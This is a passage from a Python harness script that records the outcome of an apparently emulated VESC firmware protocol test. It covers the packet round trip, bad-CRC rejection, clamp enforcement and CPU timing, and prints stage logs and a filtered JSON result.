        # Inbound protocol request -> outbound firmware-composed reply that
        # DISCRIMINATES on the request.
        result["vesc_packet_round_trip"] = bool(
            atk.get("changed")
            and atk.get("neg_bad_crc_rejected")
            and atk.get("neg_clamp_enforced"))
        result["landed"] = bool(atk.get("landed")
                                and result["vesc_packet_round_trip"])
        if result["landed"]:
            result["milestone"] = "M4"
        # Re-sample: the attack is where most of the CPU is burned, and the
        # figure in the RESULT should describe the whole run, not just the boot.
        result["gate2_child_cpu_s"] = round(sc.cpu_seconds(), 2)
    finally:
        sc.shutdown()
    return result


def main() -> int:
    def show(name, **data):
        note = data.get("note", "")
        if note:
            print(f"[stage] {name}: {note}", flush=True)
        elif "state" in data:
            print(f"[stage] {name}: {json.dumps(data['state'])}", flush=True)
        elif "result" in data:
            print(f"[stage] {name}: {json.dumps(data['result'])}", flush=True)
        else:
            print(f"[stage] {name}", flush=True)

    res = run_attack(on_stage=show)
    if res.get("milestone") == "ERROR":
        # A failure nobody reads is the same as no failure at all: print the
        # child's own output rather than handing the operator a path.
        print("--- child output (tail) ---", file=sys.stderr)
        print("\n".join(res.get("child_output_tail") or ["(empty)"]),
              file=sys.stderr)
        print("--- end child output ---", file=sys.stderr)
    print("RESULT:", json.dumps({k: v for k, v in res.items()
                                 if k in ("booted", "landed", "milestone",
                                          "vesc_packet_round_trip",
                                          "seam_control",
                                          "gate1_cpu_started",
                                          "gate2_child_cpu_s",
                                          "gate2_floor_cpu_s",
                                          "logging_cfg_present",
                                          "error", "error_detail",
                                          "child_returncode")}))
    return 0 if res.get("landed") else 1


if __name__ == "__main__":
    raise SystemExit(main())
